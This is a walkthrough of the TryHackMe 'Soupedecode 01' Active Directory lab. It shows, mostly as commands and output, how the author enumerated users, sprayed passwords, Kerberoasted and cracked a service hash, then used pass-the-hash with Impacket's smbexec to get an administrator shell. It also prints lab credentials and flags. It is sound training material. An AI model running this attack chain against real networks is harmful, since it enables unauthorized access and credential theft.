<h1 align="center">Soupedecode 01</h1>
<p align="center">2025, August 2<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>453</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Test your enumeration skills on this boot-to-root machine.</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/dd6c5cb4-8f98-4b69-b70f-92228d41555a"><br>
Click <a href=https://tryhackme.com/room/soupedecode01">here </a>to access this TryHackMe CTF.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/745f8b76-b0cc-4b16-ae97-0ef77454c2dc"></p>

<br>
<br>


<h3>/etc/hosts</h3>

```bash
TargetIP   soupedecode.thm
```

<h3>nmap</h3>

```bash
:~/Soupedecode01# nmap -Pn -p- soupedecode.thm
...
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49676/tcp open  unknown
49713/tcp open  unknown
```

<br>

```bash
:~/Soupedecode01# nmap -sC -sV -Pn -p49664,49667,49676,49713 -T4 soupedecode.thm
...
PORT      STATE SERVICE    VERSION
49664/tcp open  msrpc      Microsoft Windows RPC
49667/tcp open  msrpc      Microsoft Windows RPC
49676/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49713/tcp open  msrpc      Microsoft Windows RPC
```

<br>

```bash
:~/Soupedecode01# nmap -sC -sV -Pn -p- -T4 soupedecode.thm
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-03 01:51:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   DNS_Tree_Name: SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-03T01:53:34+00:00
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2025-06-17T21:35:42
|_Not valid after:  2025-12-17T21:35:42
|_ssl-date: 2025-08-03T01:54:14+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49713/tcp open  msrpc         Microsoft Windows RPC
49799/tcp open  msrpc         Microsoft Windows RPC
...
Host script results:
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 16:ff:e9:6c:52:45 (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-08-03T01:53:34
|_  start_date: N/A
```

<br>

<h3>/etc/hosts</h3>

```bash
TargetIP   soupedecode.thm soupedecode.local
```

<br>

<h3>nxc smb</h3>

```bash
:~/Soupedecode01# nxc smb soupedecode.local -u guest -p ''
SMB         TargetIP    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         TargetIP    445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
```

<br>

```bash
:~/Soupedecode01# nxc smb soupedecode.local -u guest -p '' --shares
SMB         TargetIP    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         TargetIP    445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB         TargetIP    445    DC01             [*] Enumerated shares
SMB         TargetIP    445    DC01             Share           Permissions     Remark
SMB         TargetIP    445    DC01             -----           -----------     ------
SMB         TargetIP    445    DC01             ADMIN$                          Remote Admin
SMB         TargetIP    445    DC01             backup                          
SMB         TargetIP    445    DC01             C$                              Default share
SMB         TargetIP    445    DC01             IPC$            READ            Remote IPC
SMB         TargetIP    445    DC01             NETLOGON                        Logon server share 
SMB         TargetIP    445    DC01             SYSVOL                          Logon server share 
SMB         TargetIP    445    DC01             Users 
```

<br>

```bash
:~/Soupedecode01# nxc smb soupedecode.local -u guest -p '' --rid > report
```
```bash
:~/Soupedecode01# head report
SMB                      10.201.16.59    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB                      10.201.16.59    445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB                      10.201.16.59    445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
SMB                      10.201.16.59    445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
SMB                      10.201.16.59    445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
SMB                      10.201.16.59    445    DC01             512: SOUPEDECODE\Domain Admins (SidTypeGroup)
SMB                      10.201.16.59    445    DC01             513: SOUPEDECODE\Domain Users (SidTypeGroup)
SMB                      10.201.16.59    445    DC01             514: SOUPEDECODE\Domain Guests (SidTypeGroup)
SMB                      10.201.16.59    445    DC01             515: SOUPEDECODE\Domain Computers (SidTypeGroup)
...
```

<br>

```bash
:~/Soupedecode01# grep 'SOUPEDECODE\\' report | cut -d':' -f2- | sed -E 's/.*SOUPEDECODE\\(.*) \(SidType.*/\1/' | grep -v '\$' > usernames.txt
```

<br>

```bash
:~/Soupedecode01# head usernames.txt
Enterprise Read-only Domain Controllers
Administrator
Guest
krbtgt
Domain Admins
Domain Users
Domain Guests
Domain Computers
Domain Controllers
Cert Publishers
```

<br>


```bash
:~/Soupedecode01# nxc smb soupedecode.local -u usernames.txt -p 'password' --no-brute --continue-on-success > report1
```


```bash
:~/Soupedecode01# cat report1 | grep '[+]'
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Enterprise Read-only Domain Controllers:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Domain Admins:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Domain Users:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Domain Guests:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Domain Computers:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Domain Controllers:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Cert Publishers:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Schema Admins:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Enterprise Admins:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Group Policy Creator Owners:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Read-only Domain Controllers:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Cloneable Domain Controllers:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Protected Users:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Key Admins:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Enterprise Key Admins:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\RAS and IAS Servers:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Allowed RODC Password Replication Group:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Denied RODC Password Replication Group:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\DnsAdmins:password (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\DnsUpdateProxy:password (Guest)
```

```bash
:~/Soupedecode01# nxc smb soupedecode.local -u usernames.txt -p usernames.txt --no-brute --continue-on-success > report2
```

```bash
cat report2 | grep '[+]'
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Enterprise Read-only Domain Controllers:Enterprise Read-only Domain Controllers (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Domain Admins:Domain Admins (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Domain Users:Domain Users (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Domain Guests:Domain Guests (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Domain Computers:Domain Computers (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Domain Controllers:Domain Controllers (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Cert Publishers:Cert Publishers (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Schema Admins:Schema Admins (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Enterprise Admins:Enterprise Admins (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Group Policy Creator Owners:Group Policy Creator Owners (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Read-only Domain Controllers:Read-only Domain Controllers (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Cloneable Domain Controllers:Cloneable Domain Controllers (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Protected Users:Protected Users (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Key Admins:Key Admins (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Enterprise Key Admins:Enterprise Key Admins (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\RAS and IAS Servers:RAS and IAS Servers (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Allowed RODC Password Replication Group:Allowed RODC Password Replication Group (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\Denied RODC Password Replication Group:Denied RODC Password Replication Group (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\DnsAdmins:DnsAdmins (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\DnsUpdateProxy:DnsUpdateProxy (Guest)
SMB                      10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
```

<br>

```bash
nxc smb soupedecode.local -u 'ybob317' -p 'ybob317' --shares
SMB         10.201.16.59    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
SMB         10.201.16.59    445    DC01             [*] Enumerated shares
SMB         10.201.16.59    445    DC01             Share           Permissions     Remark
SMB         10.201.16.59    445    DC01             -----           -----------     ------
SMB         10.201.16.59    445    DC01             ADMIN$                          Remote Admin
SMB         10.201.16.59    445    DC01             backup                          
SMB         10.201.16.59    445    DC01             C$                              Default share
SMB         10.201.16.59    445    DC01             IPC$            READ            Remote IPC
SMB         10.201.16.59    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.201.16.59    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.201.16.59    445    DC01             Users           READ            
```

<br>


```bash
smbclient //soupedecode.local/Users -U ybob317
Password for [WORKGROUP\ybob317]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu Jul  4 23:48:22 2024
  ..                                DHS        0  Wed Jun 18 23:14:47 2025
  admin                               D        0  Thu Jul  4 23:49:01 2024
  Administrator                       D        0  Sun Aug  3 02:48:27 2025
  All Users                       DHSrn        0  Sat May  8 09:26:16 2021
  Default                           DHR        0  Sun Jun 16 03:51:08 2024
  Default User                    DHSrn        0  Sat May  8 09:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 09:14:03 2021
  Public                             DR        0  Sat Jun 15 18:54:32 2024
  ybob317                             D        0  Mon Jun 17 18:24:32 2024

		12942591 blocks of size 4096. 10697015 blocks available
smb: \> cd ybob317
smb: \ybob317\> ls
  .                                   D        0  Mon Jun 17 18:24:32 2024
  ..                                 DR        0  Thu Jul  4 23:48:22 2024
  3D Objects                         DR        0  Mon Jun 17 18:24:32 2024
  AppData                            DH        0  Mon Jun 17 18:24:30 2024
  Application Data                DHSrn        0  Mon Jun 17 18:24:30 2024
  Contacts                           DR        0  Mon Jun 17 18:24:32 2024
  Cookies                         DHSrn        0  Mon Jun 17 18:24:30 2024
  Desktop                            DR        0  Fri Jul 25 18:51:44 2025
  Documents                          DR        0  Mon Jun 17 18:24:32 2024
...
smb: \ybob317\Desktop\> ls
  .                                  DR        0  Fri Jul 25 18:51:44 2025
  ..                                  D        0  Mon Jun 17 18:24:32 2024
  desktop.ini                       AHS      282  Mon Jun 17 18:24:32 2024
  user.txt                            A       33  Fri Jul 25 18:51:44 2025

		12942591 blocks of size 4096. 10697015 blocks available
smb: \ybob317\Desktop\> cat user.txt
cat: command not found
smb: \ybob317\Desktop\> get user.txt
getting file \ybob317\Desktop\user.txt of size 33 as user.txt (2.3 KiloBytes/sec) (average 2.3 KiloBytes/sec)
smb: \ybob317\Desktop\> exit
```

<br>

```bash
cat user.txt
28189316c25dd3c0ad56d44d000d62a8
```

<br>
<br>
```bash
root@ip-10-201-98-13:~# python3 -m venv venv
root@ip-10-201-98-13:~# source venv/bin/activate
(venv) root@ip-10-201-98-13:~# mkdir Soupedecode01
mkdir: cannot create directory \u2018Soupedecode01\u2019: File exists
(venv) root@ip-10-201-98-13:~# cd Soupedecode01
(venv) root@ip-10-201-98-13:~/Soupedecode01# 
apt install python3-impacket
```

```bash
(venv) :~/Soupedecode01# python3 /opt/impacket/build/scripts-3.9/GetUserSPNs.py soupedecode.local/ybob317:ybob317 -dc-ip 10.201.16.59 -request -output hashes.txt
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 18:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 18:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 18:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 18:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 18:29:18.511871  <never>               



[-] CCache file is not found. Skipping...
```


```bash
(venv) :~/Soupedecode01# cat hashes.txt
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$soupedecode.local/file_svc*$847ceb37e4bde0e39a315d72382f2873$76b635b29e661d1ad9e06ce55a51e32ad382dd924390a6a85ce4a17793835a513c48ed11eaac1b6559840e21f993a51bdc4f1cf7163e7f487b4c516ca470491e04ef47cce35a3a9cee5d4d5d3627146b6152b9bfd41a5b534da72eb3a987b97699d4f07b89d0d266203fa9eb180ec43cc0522a31eceac7f2f0e4f7b6f5d87d47cc399f69ee287d9fd5fed51176c97a13a3c2c5f22d19cc3ec024edd2f6ec8d2a960d3d65291dbe801d308ea94f8f1202e945c6090eb6983f8586073518d8b343958db76ccf9fe1e55fa4d65f392d7a1f21e90e342fb4a7b9cbcb644aca7d385fb90b59a673e5418f6a9fd3562ebd7aceeed8f50a2438da3c820e38c576b05baac96a1a646c025d6def96688523c7b5a69dcd0a71d7a9d75e5b65b9129c543fbbb5989f23b30cf8a41eca20424169227966c611323435b4efe7de8c2c81476b87545374cb9fa69aa27712597e9173bc50578ff114fd3ad7e68b4ddfab111334e3a9ee9c7715c3bb57fb3b727d9b860379f7988186ee89741ba14073160792a0bb
...
```


<p><code>file_svc</code> : <code>Password123!!</code></p>

```bash
(venv) :~/Soupedecode01# hashcat -a 0 -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --show
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$soupedecode.local/file_svc*$847ceb37e4bde0e39a315d72382f2873$76b635b29e661d1ad9e06ce55a51e32ad382dd924390a6a85ce4a17793835a513c48ed11eaac1b6559840e21f993a51bdc4f1cf7163e7f487b4c516ca470491e04ef47cce35a3a9cee5d4d5d3627146b6152b9bfd41a5b534da72eb3a987b97699d4f07b89d0d266203fa9eb180ec43cc0522a31eceac7f2f0e4f7b6f5d87d47cc399f69ee287d9fd5fed51176c97a13a3c2c5f22d19cc3ec024edd2f6ec8d2a960d3d65291dbe801d308ea94f8f1202e945c6090eb6983f8586073518d8b343958db76ccf9fe1e55fa4d65f392d7a1f21e90e342fb4a7b9cbcb644aca7d385fb90b59a673e5418f6a9fd3562ebd7aceeed8f50a2438da3c820e38c576b05baac96a1a646c025d6def96688523c7b5a69dcd0a71d7a9d75e5b65b9129c543fbbb5989f23b30cf8a41eca20424169227966c611323435b4efe7de8c2c81476b87545374cb9fa69aa27712597e9173bc50578ff114fd3ad7e68b4ddfab111334e3a9ee9c7715c3bb57fb3b727d9b860379f7988186ee89741ba14073160792a0bb5abb65f170376bb658082fc949d745a13a6a1dfc9c862a6a12def15958c68f370699ca2af5c936317a3670cde229fcaa1cddacbc63ee73cb70bd66bdfdbb2387a6767f26249dc1360bba9419c486ed621b69d756115c71d1edeea41d59792fedcb6653cc4dfa7debc8590df47c170e4e4d0114603c8388f8b2e9a484d1d51cb6ef2576711ce6d2d0a4f388c96331510a3f7dcb95bc6478598888cec09005a0eef8e2bf6b612e3d547a7620adad6e2834998215cda0f67331d6fc21d13091e4c4cb2dd8a956316f84a87005f680370cab493e9b9cbfe0d84ad5123297dca737c0c74db3cdc1e7e6241a96c009c6c32fffeff0270c9a771882fef3853b2b97104fd6fabab0454eb20723ad7632fe48ab8a654a225af339d546ad4fda21b5ad4029bc870de0ece74c28ead03256e69364e5a6f371f0fa493c1dce146455cba0047e66e2cdf843d97f8cca4f0e96cbe8594bf98fd75bbfbd3bded3ba63557935320133f65d5a86a3c65cef702918861049efff5076ed8595c400c6ac7b42d277e15f574aea8fce85517b9534957b51f6b9d907a25af347c72da3cc217985613b5ecfc79d5bd8e485d1a8554363573cbfe18ababd60bcd71e3f470684223e77f85e43d695220691927d3cc730a84604eca563ff7512fe8dc1be8b194c0b2246a6594efc46177777a8a119415a43bfcdf8d320a21b2da294ef812cf421b8613530916bc2aa5f298770bccda9fe0dec9ceb2a0adec887a69af6ed12e6653f180a1a760bd32adb46e37f97e5865ff2a83352dea3419422fafbe9d58866a52b6f3024d1495e60a40cf118096ebb6c685ce701cea68242b5d6aea9c311efd38f5e6e0ed4f104c41333adffb7cdcf3fd3c700455737e56b6ad4a780032174d36fd00a721ffe96534cebc7209fca6ca3db64f0e08d6e655c26af72bbc4708787f083ac11588f8c:Password123!!
```

```bash
(venv) :~/Soupedecode01# nxc smb soupedecode.local -u 'file_svc' -p 'Password123!!' --shares
SMB         10.201.16.59    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
SMB         10.201.16.59    445    DC01             [*] Enumerated shares
SMB         10.201.16.59    445    DC01             Share           Permissions     Remark
SMB         10.201.16.59    445    DC01             -----           -----------     ------
SMB         10.201.16.59    445    DC01             ADMIN$                          Remote Admin
SMB         10.201.16.59    445    DC01             backup          READ            
SMB         10.201.16.59    445    DC01             C$                              Default share
SMB         10.201.16.59    445    DC01             IPC$            READ            Remote IPC
SMB         10.201.16.59    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.201.16.59    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.201.16.59    445    DC01             Users                           
```


```bash
(venv) :~/Soupedecode01# smbclient //soupedecode.local/backup -U file_svc
Password for [WORKGROUP\file_svc]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 17 18:41:17 2024
  ..                                 DR        0  Fri Jul 25 18:51:20 2025
  backup_extract.txt                  A      892  Mon Jun 17 09:41:05 2024

		12942591 blocks of size 4096. 10696691 blocks available
smb: \> get backup_extract.txt
getting file \backup_extract.txt of size 892 as backup_extract.txt (45.8 KiloBytes/sec) (average 45.8 KiloBytes/sec)
smb: \> exit
```


```bash
(venv) :~/Soupedecode01# cat backup_extract.txt
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

```bash
(venv) :~/Soupedecode01#cat backup_extract.txt | cut -d ':' -f 1 > users.txt
```

```bash
(venv) :~/Soupedecode01# cat backup_extract.txt | cut -d ':' -f 4 > NTLMhashes.txt
```


```bash
(venv) :~/Soupedecode01# nxc smb soupedecode.local -u users.txt -H NTLMhashes.txt --no-brute --continue-on-success
...
SMB         10.201.16.59    445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
...
```



```bash
(venv) :~/Soupedecode01# python3 /opt/impacket/build/scripts-3.9/smbexec.py 'FileServer$'@soupedecode.local -hashes ':e41da7e79a4c76dbd9cf79d1cb325559'
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
27cb2be302c388d63d27c86bfdd5f56a
```

<br>
<br>

<img width="1907" height="891" alt="image" src="https://github.com/user-attachments/assets/f5858934-d12b-4903-be06-b5c451c56377" />

<img width="1902" height="895" alt="image" src="https://github.com/user-attachments/assets/47e4850f-6b4e-4660-9bcf-21e49f812a90" />


<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 2    | 453      |     140ᵗʰ    |      5ᵗʰ     |   1,463rd   |    25ᵗʰ    | 118,544  |    889    |    73     |


</div>


<p align="center">Global All Time:   140ᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/f881895e-e916-477c-8075-72b7e94089b4"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/21704f76-5b81-4549-87a4-25364130effc"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/86930691-a9d4-403c-b06c-984facd96845"><br>
                  Global monthly:  1,463rd<br><img width="1200px" src="https://github.com/user-attachments/assets/3ab9b315-6b99-4b1d-9039-0cc55734d725"><br>
                  Brazil monthly:     67ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/3d73a402-3a80-4bd5-a277-fba7ba9d510a"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 


